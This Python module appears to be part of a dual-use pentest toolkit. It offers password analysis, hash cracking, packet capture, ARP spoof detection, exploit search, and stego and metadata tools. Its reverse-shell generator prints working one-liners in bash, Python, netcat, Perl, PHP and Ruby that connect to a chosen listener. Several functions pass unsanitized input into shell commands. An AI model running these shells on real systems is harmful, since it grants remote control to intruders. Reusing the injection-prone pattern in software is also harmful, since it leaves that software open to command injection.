"""
Black Hat Module - Threat Simulation & Security Awareness (Educational)
Demonstrates common attack vectors and techniques for educational purposes only.
All tools here are designed for authorized testing environments.
"""

from modules.utils import (
    Colors,
    print_section,
    print_info,
    print_warning,
    print_error,
    print_status,
    run_command,
    check_tool,
    require_root,
    get_user_input,
    validate_port,
    display_menu,
    confirm_action,
    check_required_tools,
)

import hashlib
import string


def black_hat_menu():
    """Main menu for Black Hat operations."""
    print_warning("EDUCATIONAL USE ONLY - Authorized environments only!")
    print_warning("Unauthorized use of these techniques is illegal.")

    options = [
        "Password Strength Analyzer",
        "Hash Identifier & Cracker (dictionary)",
        "Network Packet Capture",
        "ARP Table Inspection",
        "Wireless Interface Discovery",
        "Exploit Database Search",
        "Reverse Shell Generator (for authorized testing)",
        "Payload Encoding Analysis",
        "Steganography Detection",
        "Metadata Extraction from Files",
        "Check Available Black Hat Tools",
    ]

    while True:
        choice = display_menu("BLACK HAT - Threat Simulation (Educational)", options, Colors.MAGENTA)
        if choice == 0:
            break
        elif choice == 1:
            password_analyzer()
        elif choice == 2:
            hash_identifier()
        elif choice == 3:
            packet_capture()
        elif choice == 4:
            arp_inspection()
        elif choice == 5:
            wireless_discovery()
        elif choice == 6:
            exploit_search()
        elif choice == 7:
            reverse_shell_generator()
        elif choice == 8:
            payload_encoding()
        elif choice == 9:
            stego_detection()
        elif choice == 10:
            metadata_extraction()
        elif choice == 11:
            check_black_tools()


def password_analyzer():
    """Analyze password strength and provide feedback."""
    print_section("Password Strength Analyzer")
    print_info("This tool evaluates password strength based on common criteria.")

    password = get_user_input("Enter a password to analyze")
    if not password:
        print_error("No password entered.")
        return

    score = 0
    feedback = []

    # Length check
    length = len(password)
    if length >= 16:
        score += 3
        feedback.append(("Length (16+)", "EXCELLENT", Colors.GREEN))
    elif length >= 12:
        score += 2
        feedback.append(("Length (12+)", "GOOD", Colors.GREEN))
    elif length >= 8:
        score += 1
        feedback.append(("Length (8+)", "FAIR", Colors.YELLOW))
    else:
        feedback.append(("Length (<8)", "WEAK", Colors.RED))

    # Character variety
    has_upper = any(c.isupper() for c in password)
    has_lower = any(c.islower() for c in password)
    has_digit = any(c.isdigit() for c in password)
    has_special = any(c in string.punctuation for c in password)

    if has_upper:
        score += 1
        feedback.append(("Uppercase letters", "Present", Colors.GREEN))
    else:
        feedback.append(("Uppercase letters", "Missing", Colors.RED))

    if has_lower:
        score += 1
        feedback.append(("Lowercase letters", "Present", Colors.GREEN))
    else:
        feedback.append(("Lowercase letters", "Missing", Colors.RED))

    if has_digit:
        score += 1
        feedback.append(("Numbers", "Present", Colors.GREEN))
    else:
        feedback.append(("Numbers", "Missing", Colors.RED))

    if has_special:
        score += 2
        feedback.append(("Special characters", "Present", Colors.GREEN))
    else:
        feedback.append(("Special characters", "Missing", Colors.YELLOW))

    # Common patterns
    common_passwords = [
        "password", "123456", "qwerty", "admin", "letmein", "welcome",
        "monkey", "dragon", "master", "login", "abc123", "111111",
        "trustno1", "iloveyou", "sunshine", "princess", "football",
    ]

    if password.lower() in common_passwords:
        score = 0
        feedback.append(("Common password", "DETECTED - EXTREMELY WEAK", Colors.RED))

    # Sequential characters
    sequential = False
    for i in range(len(password) - 2):
        if (ord(password[i]) + 1 == ord(password[i + 1]) == ord(password[i + 2]) - 1):
            sequential = True
            break
    if sequential:
        score -= 1
        feedback.append(("Sequential characters", "DETECTED", Colors.YELLOW))

    # Repeated characters
    if len(set(password)) < len(password) / 2:
        score -= 1
        feedback.append(("Excessive repetition", "DETECTED", Colors.YELLOW))

    # Display results
    print_section("Analysis Results")
    for item, status, color in feedback:
        print(f"  {color}{status:20s}{Colors.RESET} - {item}")

    print_section("Overall Score")
    max_score = 8
    score = max(0, min(score, max_score))
    bar_length = 30
    filled = int((score / max_score) * bar_length)
    bar = f"[{'#' * filled}{'.' * (bar_length - filled)}]"

    if score >= 6:
        print_info(f"Score: {score}/{max_score} {bar} - STRONG")
    elif score >= 4:
        print_warning(f"Score: {score}/{max_score} {bar} - MODERATE")
    elif score >= 2:
        print_warning(f"Score: {score}/{max_score} {bar} - WEAK")
    else:
        print_error(f"Score: {score}/{max_score} {bar} - VERY WEAK")

    # Entropy estimation
    charset_size = 0
    if has_lower:
        charset_size += 26
    if has_upper:
        charset_size += 26
    if has_digit:
        charset_size += 10
    if has_special:
        charset_size += 32
    if charset_size > 0:
        import math
        entropy = length * math.log2(charset_size)
        print_info(f"Estimated entropy: {entropy:.1f} bits")
        if entropy >= 80:
            print_info("Entropy is excellent for most purposes.")
        elif entropy >= 60:
            print_info("Entropy is adequate for general use.")
        else:
            print_warning("Entropy is low. Consider a longer, more varied password.")


def hash_identifier():
    """Identify hash types and attempt dictionary-based cracking."""
    print_section("Hash Identifier & Dictionary Cracker")

    hash_input = get_user_input("Enter a hash value (or 'generate' to hash a string)")

    if hash_input.lower() == "generate":
        plaintext = get_user_input("Enter string to hash")
        if plaintext:
            print_section("Generated Hashes")
            algorithms = ["md5", "sha1", "sha256", "sha512"]
            for algo in algorithms:
                h = hashlib.new(algo, plaintext.encode()).hexdigest()
                print_info(f"  {algo:10s}: {h}")
        return

    if not hash_input:
        print_error("No hash entered.")
        return

    # Identify hash type by length
    hash_len = len(hash_input)
    print_section("Hash Identification")

    possible_types = []
    if hash_len == 32:
        possible_types = ["MD5", "NTLM", "MD4"]
    elif hash_len == 40:
        possible_types = ["SHA-1", "MySQL5"]
    elif hash_len == 56:
        possible_types = ["SHA-224"]
    elif hash_len == 64:
        possible_types = ["SHA-256", "SHA3-256"]
    elif hash_len == 96:
        possible_types = ["SHA-384", "SHA3-384"]
    elif hash_len == 128:
        possible_types = ["SHA-512", "SHA3-512", "Whirlpool"]
    else:
        possible_types = ["Unknown"]

    print_info(f"Hash length: {hash_len} characters")
    print_info(f"Possible types: {', '.join(possible_types)}")

    # Attempt dictionary crack with common passwords
    if confirm_action("Attempt dictionary crack with common passwords?"):
        print_status("Trying common passwords...")
        common_words = [
            "password", "123456", "12345678", "qwerty", "abc123",
            "monkey", "1234567", "letmein", "trustno1", "dragon",
            "baseball", "iloveyou", "master", "sunshine", "ashley",
            "bailey", "shadow", "123456789", "654321", "superman",
            "qazwsx", "michael", "football", "password1", "password123",
            "admin", "admin123", "root", "toor", "test", "guest",
        ]

        found = False
        for word in common_words:
            for algo in ["md5", "sha1", "sha256", "sha512"]:
                h = hashlib.new(algo, word.encode()).hexdigest()
                if h == hash_input.lower():
                    print_error(f"  CRACKED! Algorithm: {algo}, Plaintext: '{word}'")
                    found = True
                    break
            if found:
                break

        if not found:
            print_info("Hash not found in common password list.")
            print_info("For advanced cracking, use tools like: hashcat, john")


def packet_capture():
    """Capture network packets for analysis."""
    print_section("Network Packet Capture")

    require_root("Packet capture")

    if not confirm_action("This will capture network traffic. Proceed?"):
        return

    if check_tool("tcpdump"):
        interface = get_user_input("Network interface", "any")
        count = get_user_input("Number of packets to capture", "20")
        filter_expr = get_user_input("Capture filter (e.g., 'port 80', 'host 10.0.0.1')", "")

        cmd = f"tcpdump -i {interface} -c {count} -nn"
        if filter_expr:
            cmd += f" {filter_expr}"

        print_status(f"Capturing {count} packets on {interface}...")
        stdout, stderr, rc = run_command(cmd, timeout=30)

        output = stdout if stdout else stderr
        if output:
            print_info("Captured packets:")
            print(output)
        else:
            print_warning("No packets captured.")
    elif check_tool("tshark"):
        interface = get_user_input("Network interface", "any")
        count = get_user_input("Number of packets", "20")

        print_status(f"Capturing with tshark...")
        stdout, stderr, rc = run_command(
            f"tshark -i {interface} -c {count} 2>/dev/null", timeout=30
        )
        if stdout:
            print_info("Captured packets:")
            print(stdout)
    else:
        print_error("No packet capture tools found (tcpdump, tshark).")
        print_info("Install with: sudo apt install tcpdump")


def arp_inspection():
    """Inspect ARP table for potential spoofing."""
    print_section("ARP Table Inspection")

    # Get ARP table
    stdout, _, _ = run_command("arp -a 2>/dev/null || ip neigh show 2>/dev/null")
    if stdout:
        print_info("Current ARP table:")
        print(stdout)

        # Check for duplicate MACs (potential ARP spoofing)
        print_section("ARP Spoofing Detection")
        lines = stdout.strip().split("\n")
        mac_map = {}
        for line in lines:
            parts = line.split()
            for part in parts:
                # Simple MAC detection (xx:xx:xx:xx:xx:xx)
                if len(part.split(":")) == 6 or len(part.split("-")) == 6:
                    mac = part.lower()
                    ip_addr = parts[0] if parts else "unknown"
                    if mac in mac_map:
                        mac_map[mac].append(ip_addr)
                    else:
                        mac_map[mac] = [ip_addr]

        spoofing_detected = False
        for mac, ips in mac_map.items():
            if len(ips) > 1 and mac != "ff:ff:ff:ff:ff:ff":
                print_error(f"  Duplicate MAC {mac} for IPs: {', '.join(ips)}")
                print_error("  POSSIBLE ARP SPOOFING!")
                spoofing_detected = True

        if not spoofing_detected:
            print_info("No duplicate MAC addresses detected. ARP table appears clean.")
    else:
        print_error("Could not retrieve ARP table.")


def wireless_discovery():
    """Discover wireless interfaces and nearby networks."""
    print_section("Wireless Interface Discovery")

    # List wireless interfaces
    stdout, _, _ = run_command("iw dev 2>/dev/null")
    if stdout:
        print_info("Wireless interfaces:")
        print(stdout)
    else:
        stdout, _, _ = run_command("iwconfig 2>/dev/null")
        if stdout and "no wireless" not in stdout.lower():
            print_info("Wireless interfaces:")
            print(stdout)
        else:
            print_warning("No wireless interfaces found.")
            return

    # Scan for networks
    if confirm_action("Scan for nearby wireless networks?"):
        require_root("Wireless scanning")
        interface = get_user_input("Wireless interface", "wlan0")

        if check_tool("iw"):
            print_status(f"Scanning on {interface}...")
            stdout, stderr, _ = run_command(f"iw dev {interface} scan 2>/dev/null | grep -E 'SSID|signal|freq'")
            if stdout:
                print_info("Nearby networks:")
                print(stdout)
            else:
                print_warning(f"Could not scan (interface may be down): {stderr}")
        elif check_tool("iwlist"):
            stdout, _, _ = run_command(f"iwlist {interface} scan 2>/dev/null | grep -E 'ESSID|Quality|Encryption'")
            if stdout:
                print_info("Nearby networks:")
                print(stdout)


def exploit_search():
    """Search for known exploits using searchsploit or online databases."""
    print_section("Exploit Database Search")

    query = get_user_input("Enter search term (e.g., 'apache 2.4', 'ssh', 'wordpress')")
    if not query:
        print_error("No search term provided.")
        return

    if check_tool("searchsploit"):
        print_status(f"Searching exploit database for '{query}'...")
        stdout, _, rc = run_command(f"searchsploit {query}", timeout=30)
        if rc == 0 and stdout:
            print_info("Exploit results:")
            print(stdout)
        else:
            print_warning("No results found.")
    else:
        print_warning("searchsploit not found.")
        print_info("Install with: sudo apt install exploitdb")
        print_info(f"Manual search: https://www.exploit-db.com/search?q={query.replace(' ', '+')}")
        print_info(f"Also try: https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword={query.replace(' ', '+')}")

    # Check CVE databases with curl
    if check_tool("curl"):
        if confirm_action("Search NVD for CVEs?"):
            print_status("Searching NVD for '{}'...".format(query))
            encoded_query = query.replace(" ", "%20")
            nvd_url = "https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch=" + encoded_query
            parse_script = (
                "import sys,json; d=json.load(sys.stdin); "
                "[print(v['cve']['id'] + ': ' + v['cve'].get('descriptions',[{}])[0].get('value','N/A')[:100]) "
                "for v in d.get('vulnerabilities',[])[:10]]"
            )
            cmd = "curl -s '{}' 2>/dev/null | python3 -c \"{}\" 2>/dev/null".format(
                nvd_url, parse_script
            )
            stdout, _, rc = run_command(cmd, timeout=15)
            if stdout:
                print_info("Recent CVEs:")
                print(stdout)
            else:
                print_warning("Could not fetch CVE data.")


def reverse_shell_generator():
    """Generate reverse shell one-liners for authorized penetration testing."""
    print_section("Reverse Shell Generator")
    print_warning("FOR AUTHORIZED PENETRATION TESTING ONLY!")
    print_warning("Unauthorized use is illegal and unethical.")

    if not confirm_action("Are you authorized to perform penetration testing?"):
        print_info("Operation cancelled.")
        return

    lhost = get_user_input("Listener IP (your IP)")
    lport = get_user_input("Listener port", "4444")

    if not lhost:
        print_error("Listener IP is required.")
        return

    if not validate_port(lport):
        print_error("Invalid port.")
        return

    print_section("Reverse Shell One-Liners")
    shells = {
        "Bash": f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
        "Python": f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
        "Netcat (traditional)": f"nc -e /bin/sh {lhost} {lport}",
        "Netcat (OpenBSD)": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f",
        "Perl": f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\")}};'",
        "PHP": f"php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        "Ruby": f"ruby -rsocket -e'f=TCPSocket.open(\"{lhost}\",{lport}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
    }

    for name, cmd in shells.items():
        print_info(f"{name}:")
        print(f"    {cmd}\n")

    print_section("Listener Command")
    print_info(f"Start listener with: nc -lvnp {lport}")


def payload_encoding():
    """Demonstrate payload encoding techniques for security awareness."""
    print_section("Payload Encoding Analysis")
    print_info("This demonstrates how payloads can be encoded/obfuscated.")

    text = get_user_input("Enter text to encode")
    if not text:
        print_error("No text provided.")
        return

    import base64

    print_section("Encoding Results")

    # Base64
    b64 = base64.b64encode(text.encode()).decode()
    print_info(f"Base64:     {b64}")
    print_info(f"  Decode:   echo '{b64}' | base64 -d")

    # Hex
    hex_str = text.encode().hex()
    print_info(f"Hex:        {hex_str}")
    print_info(f"  Decode:   echo '{hex_str}' | xxd -r -p")

    # URL encoding
    url_encoded = ""
    for c in text:
        if c.isalnum() or c in "-_.~":
            url_encoded += c
        else:
            url_encoded += f"%{ord(c):02x}"
    print_info(f"URL:        {url_encoded}")

    # ROT13
    rot13 = text.translate(str.maketrans(
        "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz",
        "NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm",
    ))
    print_info(f"ROT13:      {rot13}")

    # Octal
    octal_str = " ".join(f"\\{ord(c):03o}" for c in text)
    print_info(f"Octal:      {octal_str}")

    # Binary
    binary_str = " ".join(f"{ord(c):08b}" for c in text)
    print_info(f"Binary:     {binary_str}")


def stego_detection():
    """Detect steganography in files."""
    print_section("Steganography Detection")

    filepath = get_user_input("Enter file path to analyze")
    if not filepath:
        print_error("No file path provided.")
        return

    # Check file exists
    stdout, _, rc = run_command(f"test -f {filepath} && echo 'exists'")
    if "exists" not in stdout:
        print_error(f"File not found: {filepath}")
        return

    # File type detection
    print_section("File Analysis")
    stdout, _, _ = run_command(f"file {filepath}")
    if stdout:
        print_info(f"File type: {stdout}")

    # Check for strings in binary
    if check_tool("strings"):
        stdout, _, _ = run_command(f"strings {filepath} | head -30")
        if stdout:
            print_section("Embedded Strings (first 30)")
            print(stdout)

    # Check file for appended data
    stdout, _, _ = run_command(f"xxd {filepath} | tail -10")
    if stdout:
        print_section("File Tail (hex dump)")
        print(stdout)

    # Steghide check
    if check_tool("steghide"):
        print_section("Steghide Analysis")
        stdout, stderr, _ = run_command(f"steghide info {filepath} 2>&1")
        output = stdout if stdout else stderr
        if output:
            print_info(f"Steghide result:\n{output}")
    else:
        print_info("Install steghide for deeper analysis: sudo apt install steghide")

    # Exiftool for metadata
    if check_tool("exiftool"):
        print_section("EXIF Metadata")
        stdout, _, _ = run_command(f"exiftool {filepath}")
        if stdout:
            print(stdout)


def metadata_extraction():
    """Extract metadata from files for forensic analysis."""
    print_section("File Metadata Extraction")

    filepath = get_user_input("Enter file path")
    if not filepath:
        print_error("No file path provided.")
        return

    # Check file exists
    stdout, _, rc = run_command(f"test -f {filepath} && echo 'exists'")
    if "exists" not in stdout:
        print_error(f"File not found: {filepath}")
        return

    # Basic file info
    print_section("Basic File Information")
    stdout, _, _ = run_command(f"file {filepath}")
    if stdout:
        print_info(f"Type: {stdout}")

    stdout, _, _ = run_command(f"stat {filepath}")
    if stdout:
        print_info(f"Statistics:\n{stdout}")

    # MD5/SHA hashes
    print_section("File Hashes")
    stdout, _, _ = run_command(f"md5sum {filepath}")
    if stdout:
        print_info(f"MD5:    {stdout.split()[0]}")
    stdout, _, _ = run_command(f"sha256sum {filepath}")
    if stdout:
        print_info(f"SHA256: {stdout.split()[0]}")

    # Exiftool
    if check_tool("exiftool"):
        print_section("EXIF/Metadata (exiftool)")
        stdout, _, _ = run_command(f"exiftool {filepath}")
        if stdout:
            print(stdout)
    else:
        print_info("Install exiftool for detailed metadata: sudo apt install libimage-exiftool-perl")

    # PDF metadata
    stdout_file, _, _ = run_command(f"file {filepath}")
    if "pdf" in stdout_file.lower():
        if check_tool("pdfinfo"):
            print_section("PDF Metadata")
            stdout, _, _ = run_command(f"pdfinfo {filepath}")
            if stdout:
                print(stdout)

    # Image specific
    if any(ext in stdout_file.lower() for ext in ["jpeg", "png", "gif", "tiff", "image"]):
        if check_tool("identify"):
            print_section("Image Details (ImageMagick)")
            stdout, _, _ = run_command(f"identify -verbose {filepath} 2>/dev/null | head -30")
            if stdout:
                print(stdout)


def check_black_tools():
    """Check availability of common offensive security tools."""
    print_section("Black Hat Tool Availability Check")

    tools = [
        "nmap", "masscan", "nikto", "sqlmap", "hydra",
        "john", "hashcat", "aircrack-ng", "airmon-ng",
        "msfconsole", "msfvenom", "searchsploit",
        "burpsuite", "zaproxy", "wpscan", "gobuster",
        "dirb", "ffuf", "feroxbuster",
        "tcpdump", "tshark", "wireshark",
        "steghide", "binwalk", "foremost",
        "exiftool", "strings", "xxd", "objdump",
        "gdb", "radare2", "ghidra",
        "nc", "ncat", "socat", "proxychains",
        "tor", "openvpn", "ssh",
    ]

    check_required_tools(tools)
